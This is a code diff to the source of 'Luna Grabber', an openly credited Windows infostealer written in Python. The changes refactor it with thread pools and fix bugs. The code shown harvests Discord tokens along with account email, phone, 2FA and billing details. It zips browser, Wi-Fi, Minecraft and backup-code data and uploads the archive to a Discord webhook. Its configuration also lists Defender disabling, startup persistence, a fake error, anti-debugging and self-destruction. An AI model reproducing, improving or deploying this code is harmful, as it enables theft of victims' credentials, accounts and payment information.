@@ -1,4 +1,5 @@
 import base64
+import concurrent.futures
 import ctypes
 import json
 import os
@@ -9,12 +10,13 @@ import subprocess
 import sys
 import threading
 import time
+from multiprocessing import cpu_count
 from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
 
 import psutil
 import requests
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
@@ -52,14 +54,8 @@ def main(webhook: str):
     threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
-    for func in threads:
-        process = threading.Thread(target=func, daemon=True)
-        process.start()
-    for t in threading.enumerate():
-        try:
-            t.join()
-        except RuntimeError:
-            continue
+    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
+        executor.map(lambda func: func(), threads)
 
     zipup()
 
@@ -75,7 +71,7 @@ def main(webhook: str):
             content = f"@{__CONFIG__['pingtype'].lower()}"
             data.update({"content": content})
 
-    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
+    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
         with open(_file, 'rb') as file:
             encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
@@ -98,12 +94,10 @@ def Luna(webhook: str):
     if __CONFIG__["antidebug_vm"]:
         Debug()
 
-    procs = [main, Injection]
-    if not __CONFIG__["injection"]:
-        procs.remove(Injection)
-
-    for proc in procs:
-        proc(webhook)
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        if __CONFIG__["injection"]:
+            executor.submit(Injection, webhook)
+        executor.submit(main, webhook)
 
     if __CONFIG__["self_destruct"]:
         SelfDestruct()
@@ -201,11 +195,10 @@ def killprotector():
 def zipup():
     _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
     zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
-    abs_src = os.path.abspath(temp_path)
     for dirname, _, files in os.walk(temp_path):
         for filename in files:
-            absname = os.path.abspath(os.path.join(dirname, filename))
-            arcname = absname[len(abs_src) + 1:]
+            absname = os.path.join(dirname, filename)
+            arcname = os.path.relpath(absname, temp_path)
             zipped_file.write(absname, arcname)
     zipped_file.close()
 
@@ -427,26 +420,27 @@ class Discord:
     def upload(self, webhook):
         for token in self.tokens:
             if token in self.tokens_sent:
-                pass
+                continue
 
             val = ""
-            nitro = ""
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                       'Content-Type': 'application/json',
-                       'Authorization': token}
+            methods = ""
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                'Content-Type': 'application/json',
+                'Authorization': token
+            }
             user = requests.get(self.baseurl, headers=headers).json()
-            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
+            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
+                                   headers=headers).json()
             username = user['username'] + '#' + user['discriminator']
             discord_id = user['id']
-            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
-                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
+            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
+                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
+                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
             phone = user['phone']
             email = user['email']
 
-            if user['mfa_enabled']:
-                mfa = "✅"
-            else:
-                mfa = "❌"
+            mfa = "✅" if user.get('mfa_enabled') else "❌"
 
             premium_types = {
                 0: "❌",
@@ -454,18 +448,12 @@ class Discord:
                 2: "Nitro",
                 3: "Nitro Basic"
             }
-            nitro = premium_types.get(user['premium_type'], "❌")
+            nitro = premium_types.get(user.get('premium_type'), "❌")
 
-            methods = "❌"
-            if payment:
-                methods = ""
-                for method in payment:
-                    if method['type'] == 1:
-                        methods += "💳"
-                    elif method['type'] == 2:
-                        methods += "<:paypal:973417655627288666>"
-                    else:
-                        methods += "❓"
+            if "message" in payment or payment == []:
+                methods = "❌"
+            else:
+                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "❓" for method in payment])
 
             val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
 
@@ -481,7 +469,7 @@ class Discord:
                             }
                         ],
                         "thumbnail": {
-                            "url": avatar
+                            "url": avatar_url
                         },
                         "footer": {
                             "text": "Luna Grabber | Created By Smug"
@@ -493,7 +481,7 @@ class Discord:
             }
 
             requests.post(webhook, json=data)
-            self.tokens_sent += token
+            self.tokens_sent.append(token)
 
         self.robloxinfo(webhook)
 
@@ -725,6 +713,7 @@ class Browsers:
                             f.write(robo_cookie + "\n\n")
                     if os.path.getsize(robo_cookie_file) == 0:
                         f.write("No Roblox Cookies Found")
+
 
 class Wifi:
     def __init__(self):
